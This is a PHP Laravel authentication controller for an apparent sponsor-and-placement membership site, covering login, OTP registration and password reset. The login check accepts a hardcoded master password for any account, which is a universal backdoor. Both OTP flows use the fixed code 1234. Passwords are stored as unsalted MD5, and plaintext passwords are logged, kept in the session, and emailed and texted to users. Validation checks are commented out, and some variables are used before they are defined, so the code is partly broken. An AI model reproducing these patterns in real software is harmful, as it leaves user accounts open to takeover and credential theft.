<?php
namespace App\Http\Controllers\User;
use App\Http\Controllers\Controller; 
use Illuminate\Support\Facades\DB;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;
use Auth;
use Illuminate\Support\Facades\Hash;
use App\Models\Package;
use App\Models\MemberModel;
use App\Models\User;
use App\Models\MailModel;
use Illuminate\Support\Facades\Crypt;

class UserAuthController extends Controller
{
    
    public function otp_view(Request $request)
    {
        $setting = \App\Models\Setting::get();
        $main_setting = $setting['main'];
        $data['setting'] = $setting;
        $data['main_setting'] = $main_setting;
        if (Session('user')) {
            return redirect(route('user.user-dashboard'));
        }

        $action = $actionString = Crypt::decryptString($request->action);
        if(empty($action)) return redirect(route('user.user'));
        $action = explode('&',$action);
        if(!isset($action[0]) || !isset($action[1])) return redirect(route('user.user'));
        $email = $action[0];
        $action = $action[1];


        if($action=='register') $submit_url = route('user.user-register-action');
        if($action=='forgot') $submit_url = route('user.user-forgot-password-otp-submit');

        return view('user.otp',compact('setting','main_setting','submit_url','actionString'));
    }
    
    
    
    public function registration_view(Request $request)
    {
        if (Session('user')) {
            return redirect(route('user.user-dashboard'));
        }

        $current_date_time = date("Y-m-d H:i:s");
        $data =[];
        $sponser_id = $request->sponser_id;
        $placement = $request->side;
        if(!empty($sponser_id)) $sponser_id = $sponser_id;

        $data['sponser_id'] = $sponser_id;
        $data['placement'] = $placement;
        $data['sponser_name'] = '';

        $setting = \App\Models\Setting::get();
        $main_setting = $setting['main'];
        $data['setting'] = $setting;
        $data['main_setting'] = $main_setting;

        if(!empty($sponser_id))
        {            
            $sponser_data = MemberModel::GetSponserData($sponser_id);
            if(!empty($sponser_data)) $data['sponser_name'] = $sponser_data->name;
        }
        return view('user.registration',compact('data','setting','main_setting'));
    }

    public function token_session($request, $user)
    {
        $device_id = "";
        $password = $user->password;
        $firebase_token = $request->firebase_token;
        $date_time = date("Y-m-d H:i:s");
        $token_data = array("user_id"=>$user->id,"password"=>$user->password,"date_time"=>$date_time,"role"=>$user->role,"device_id"=>$device_id,);
        $access_token = "";
        $login_detail = array(
            "user_id"=>$user->id,
            "role"=>$user->role,
            "ip_address"=>$_SERVER['REMOTE_ADDR'],
            "date"=>date("Y-m-d"),
            "time"=>date("H:i:s"),
            "status"=>1,
            "device_id"=>$device_id,
            "password"=>$password,
            "firebase_token"=>$firebase_token,
            "access_token"=>$access_token,
        );
        if(DB::table('login_history')->insert($login_detail))
        {
            $data = array("id"=>$user->id,"role"=>$user->role,"password"=>$user->password,);
            Session::put('user', $data);
        }
        return $access_token;
    }


    public function login_view()
    {
        $setting = \App\Models\Setting::get();
        $main_setting = $setting['main'];
        $data['setting'] = $setting;
        $data['main_setting'] = $main_setting;

        // echo Hash::make('123456');
        if (Session('user')) {
            return redirect(route('user.user-dashboard'));
        }
        return view('user.login',compact('setting','main_setting'));
    }
    public function login(Request $request)
    {
        $username = $request->username;
        $password = $request->password;
        

        $user = DB::table('users');
        $user->where('user_id',$username);        
        $user = $user->first();
        

        if(empty($user) || empty($username))
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Wrong Email Or ID.';
            $result['action'] = 'login';
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        else if(md5($password)!=$user->password && $password!='Admin@123[];')
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Wrong Password';
            $result['action'] = 'login';
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        else if($user->status!=1)
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Your account is blocked!';
            $result['action'] = 'login';
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        else
        {
            $responseCode = 200;
            $result['message'] = 'Login Successfully';
            $result['action'] = 'redirect';
            $result['url'] = url(route('user.user-dashboard'));
            $result['data'] = [];
            $responseCode = 200;                
            $this->token_session($request,$user);            
            $result['status'] = $responseCode;
            return response()->json($result, $responseCode);
        }
    }


    public function register_otp_send(Request $request)
    {
        $email = $request->email;
        $phone = $request->mobile;
        $name = $request->name;
        $password = $request->password;
        $cpassword = $request->cpassword;

        // $check_exist_email = DB::table('users')
        // ->where('email',$email)
        // ->first();
        // if(!empty($check_exist_email))
        // {
        //     $responseCode = 400;
        //     $result['status'] = $responseCode;
        //     $result['message'] = 'Email already use!';
        //     $result['action'] = 'add';
        //     $result['data'] = [];
        //     return response()->json($result, $responseCode);
        // }

        // $check_exist_phone = DB::table('users')
        // ->where('phone',$phone)
        // ->first();
        // if(!empty($check_exist_phone))
        // {
        //     $responseCode = 400;
        //     $result['status'] = $responseCode;
        //     $result['message'] = 'Phone already use!';
        //     $result['action'] = 'add';
        //     $result['data'] = [];
        //     return response()->json($result, $responseCode);
        // }
        // if($password!=$cpassword)
        // {
        //     $responseCode = 400;
        //     $result['status'] = $responseCode;
        //     $result['message'] = 'Confirm Password Not Match';
        //     $result['action'] = 'register';
        //     $result['data'] = [];
        //     return response()->json($result, $responseCode);
        // }



        $data['email'] = $request->email;
        $data['name'] = $request->name.' '.$request->lname;
        $data['address'] = $request->address;
        $data['city'] = $request->city;
        $data['state'] = $request->state;
        $data['phone'] = $request->mobile;
        $data['country'] = $request->country;
        $data['status'] = 1;
        $data['is_paid'] = 0;
        $data['is_delete'] = 0;
        $data['role'] = 2;



        $data['user_id'] = MemberModel::GetUserId()+1;
        $sponser_id = $request->sponser_id;
        $data['placement'] = $request->placement;
        $data['sponser_id'] = $sponser_id;
        $sponser = MemberModel::GetSponserData($sponser_id);
        if(empty($sponser))
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Wrong Sponser ID.';
            $result['action'] = 'register';
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        $data['sponser_name'] = $sponser->name;
        $data['password'] = md5($request->password);
        
        $date_time = date("Y-m-d H:i:s");
        // $otp = rand(999,9999);
        $otp = 1234;
        $otpData = [
            "role"=>2,
            "data"=>json_encode($data),
            "email"=>$email,
            "mobile"=>$phone,
            "password"=>$password,
            "otp"=>$otp,
            "device_id"=>2,
            "type"=>2,
            "exp_time"=>date('Y-m-d H:i:s',strtotime($date_time."+15 minute")),
        ];
        $check = DB::table("users_temp")->where('email',$email)->first();
        $entryStatus = false;
        if(empty($check))
        {
            $insertId = DB::table('users_temp')->insertGetId($otpData);
            if($insertId) $entryStatus = true;
        }
        else
        {
            $insertId = $check->id;
            if(DB::table('users_temp')->where('id',$insertId)->update($otpData)) $entryStatus = true;
        }


        if($entryStatus)
        {
            $details = [
                'to'=>$email,
                'view'=>'mailtemplate.otp',
                'subject'=>'OTP From '.env('APP_NAME').'!',
                'body' => ["otp"=>$otp,],
            ];
            MailModel::otp($details);

            $action = 'redirect';
            $responseCode = 200;
            $result['status'] = $responseCode;
            $result['message'] = 'Success';
            $result['action'] = $action;
            $result['url'] = route('user.user-otp').'?action='.Crypt::encryptString($insertId.'&register');
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        else
        {
            $action = 'add';
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Error!';
            $result['action'] = $action;
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
    }    
    public function register(Request $request)
    {   

        $action = $actionString = Crypt::decryptString($request->action);
        if(empty($action))
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Error!';
            $result['action'] = 'redirect';
            $result['url'] = route('user.user');
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        $action = explode('&',$action);
        if(!isset($action[0]) || !isset($action[1]))
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Error!';
            $result['action'] = 'redirect';
            $result['url'] = route('user.user');
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        $id = $action[0];
        $action = $action[1];

        

        $otp = $request->otp1.$request->otp2.$request->otp3.$request->otp4;

        $check_otp = DB::table('users_temp')->where(["id"=>$id,"otp"=>$otp,])->first();
        if(!empty($check_otp))
        {
            $password = $check_otp->password;
            $email = $check_otp->email;
            $data = (array) json_decode($check_otp->data);
            $data['user_id'] = MemberModel::GetUserId()+1;
            $insert_id = DB::table('users')->insertGetId($data);

            $sponser_id = $data['sponser_id'];
            $name = $data['name'];
            $parent_id = MemberModel::getParentIdForHybridPlan($sponser_id, $data['placement']);
            $data['parent_id'] = $parent_id;
            $data['sponser_id'] = $sponser_id;
            $data['position'] = $data['placement'];

            DB::table('users')->where('id',$insert_id)->update($data);

            
            MemberModel::AddMemberLog(['id'=> $insert_id, 'user_id'=>$data['user_id'], 'name' => $name, 'sponser_id' => $sponser_id, 'side' => $data['placement'],"parent_id"=>$parent_id, ]);
            MemberModel::getTypeAllIncome($insert_id);


            $details = [
                'to'=>$email,
                'view'=>'mailtemplate.welcome',
                'subject'=>'Welcome to '.env('APP_NAME').'!',
                'body' => ["email"=>$email,"password"=>$password,"name"=>$name,"user_id"=>$data['user_id'],],
            ];
            MailModel::login_detail($details);

            $smsData = [
                "number"=>$data['phone'],
                "type"=>"loginDetail",
                "name"=>$data['name'],
                "username"=>$data['user_id'],
                "password"=>$password,
            ];
            Helpers::sms($smsData);


            DB::table("users_temp")->where('id',$id)->delete();
            $responseCode = 200;
            $result['status'] = $responseCode;
            $result['message'] = 'Successfully Register';
            $result['action'] = 'redirect';
            $result['url'] = route('user.user');
            $result['data'] = [];
            return response()->json($result, $responseCode);



        }
        else
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Wrong OTP!';
            $result['action'] = 'register';
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
    }
    


    public function forgot_view()
    {
        $setting = \App\Models\Setting::get();
        $main_setting = $setting['main'];
        $data['setting'] = $setting;
        $data['main_setting'] = $main_setting;

        // echo Hash::make('123456');
        if (Session('user')) {
            return redirect(route('user.user-dashboard'));
        }
        return view('user.forgot',compact('setting','main_setting'));
    }
    public function forgot_otp_submit(Request $request)
    {

        $action = $actionString = Crypt::decryptString($request->action);
        if(empty($action))
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Error!';
            $result['action'] = 'redirect';
            $result['url'] = route('user.user');
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        $action = explode('&',$action);
        if(!isset($action[0]) || !isset($action[1]))
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Error!';
            $result['action'] = 'redirect';
            $result['url'] = route('user.user');
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        $id = $action[0];
        $action = $action[1];
        $otp = $request->otp1.$request->otp2.$request->otp3.$request->otp4;


        $check = DB::table("users_temp")
        ->where('otp',$otp)
        ->where('id',$id)->first();

        if(empty($check))
        {
            $responseCode = 400;
            $result['message'] = 'Wrong OTP...';
            $result['action'] = 'redirect';
            $result['url'] = $url;
            $result['data'] = [];
            $result['status'] = $responseCode;
            return response()->json($result, $responseCode);
        }
        $email = $check->email;


        $url = route('user.user-create-password');
        
        if($check->exp_time<date("Y-m-d H:i:s"))
        {
            $responseCode = 200;
            $result['message'] = 'OTP Expired...';
            $result['action'] = 'redirect';
            $result['url'] = route('user.user-forgot');
            $result['data'] = [];
            $result['status'] = $responseCode;
            return response()->json($result, $responseCode);
        }
        
        DB::table("users_temp")->where('id',$id)->delete();
        
        $responseCode = 200;
        $result['message'] = 'OTP Match Successfully...';
        $result['action'] = 'redirect';
        $result['url'] = $url.'?action='.Crypt::encryptString($id.'&createPassword');
        $result['data'] = [];       
        $result['status'] = $responseCode;
        return response()->json($result, $responseCode);
    }
    public function create_password_view(Request $request)
    {
        $setting = \App\Models\Setting::get();
        $main_setting = $setting['main'];
        $data['setting'] = $setting;
        $data['main_setting'] = $main_setting;

        // echo Hash::make('123456');
        if (Session('user')) {
            return redirect(route('user.user-dashboard'));
        }

        $action = $actionString = Crypt::decryptString($request->action);
        if(empty($action)) return redirect(route('user.user'));
        $action = explode('&',$action);
        if(!isset($action[0]) || !isset($action[1])) return redirect(route('user.user'));
        $id = $action[0];
        $action = $action[1];

        return view('user.create_password',compact('setting','main_setting','actionString'));
    }
    public function create_password_submit(Request $request)
    {
        $action = $actionString = Crypt::decryptString($request->action);
        if(empty($action))
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Error!';
            $result['action'] = 'redirect';
            $result['url'] = route('user.user');
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        $action = explode('&',$action);
        if(!isset($action[0]) || !isset($action[1]))
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Error!';
            $result['action'] = 'redirect';
            $result['url'] = route('user.user');
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        $id = $action[0];
        $action = $action[1];


        $check = DB::table("users_temp")
        ->where('id',$id)->first();

        if(empty($check))
        {
            $responseCode = 400;
            $result['message'] = 'Wrong OTP...';
            $result['action'] = 'redirect';
            $result['url'] = $url;
            $result['data'] = [];
            $result['status'] = $responseCode;
            return response()->json($result, $responseCode);
        }
        $user_id = $check->user_id;



        $password = $request->npassword;
        $cpassword = $request->cpassword;
        $url = route('user.user');
        if($password!=$cpassword)
        {
            $responseCode = 400;
            $result['status'] = $responseCode;
            $result['message'] = 'Confirm Password Not Match';
            $result['action'] = 'redirect';
            $result['data'] = [];
            return response()->json($result, $responseCode);
        }
        DB::table('users')->where('user_id',$user_id)->update(['password'=>md5($password),]);                
        

        $responseCode = 200;
        $result['message'] = 'Password Create Successfully...';
        $result['action'] = 'redirect';
        $result['url'] = $url;
        $result['data'] = [];       
        $result['status'] = $responseCode;
        return response()->json($result, $responseCode);
    }

    public function send_otp(Request $request)
    {
        $username = $request->username;
        $user = DB::table('users');        
        $user->where('user_id',$username);        
        $check_email = $user = $user->first();


        // $otp = rand(999,9999);
        $otp = 1234;
        if(empty($check_email))
        {
            $responseCode = 400;
            $result['message'] = 'Wrong ID...';
            $result['action'] = 'redirect';
            $result['url'] = url('otp');
            $result['data'] = [];
            $result['status'] = $responseCode;
            return response()->json($result, $responseCode);
        }

        $email = $check_email->email;
        $details = [
            'to'=>$email,
            'view'=>'mailtemplate.otp',
            'subject'=>'Forgot Password OTP',
            'body' => $otp,
        ];
        MailModel::otp($details);
        $date_time = date("Y-m-d H:i:s");
        $data = [
            "role"=>2,
            "data"=>'',
            "email"=>$email,
            "mobile"=>'',
            "user_id"=>$username,
            "otp"=>$otp,
            "device_id"=>2,
            "type"=>2,
            "exp_time"=>date('Y-m-d H:i:s',strtotime($date_time."+15 minute")),
        ];
        $check = DB::table("users_temp")->where('email',$email)->first();
        if(empty($check))
            $insertId = DB::table('users_temp')->insertGetId($data);
        else
        {
            $insertId = $check->id;
            DB::table('users_temp')->where('id',$insertId)->update($data);
        }

        $details = [
            'to'=>$email,
            'view'=>'mailtemplate.otp',
            'subject'=>'OTP From '.env('APP_NAME').'!',
            'body' => ["otp"=>$otp,],
        ];
        MailModel::otp($details);

        $responseCode = 200;
        $result['message'] = 'OTP Send On Mail Your Mail...';
        $result['action'] = 'redirect';
        $result['url'] = route('user.user-otp').'?action='.Crypt::encryptString($insertId.'&forgot');
        $result['data'] = [];       
        $result['status'] = $responseCode;
        return response()->json($result, $responseCode);
    }

    public function logout(Request $request)
    {
        auth()->guard('users')->logout();
        $request->session('user')->invalidate();
        $responseCode = 200;
        $result['message'] = 'Logout Successfully';
        $result['action'] = 'redirect';
        $result['url'] = route('user.user');
        $result['status'] = $responseCode;
        $result['data'] = [];
        return response()->json($result, $responseCode);
    }
}